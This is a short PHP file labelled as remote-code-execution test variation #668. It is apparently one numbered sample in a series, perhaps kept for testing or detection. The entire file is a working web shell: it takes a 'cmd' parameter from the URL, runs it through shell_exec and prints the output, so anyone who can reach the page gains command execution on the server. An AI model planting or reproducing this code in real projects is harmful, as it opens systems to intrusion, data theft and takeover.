<?php
// RCE test variation #668
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>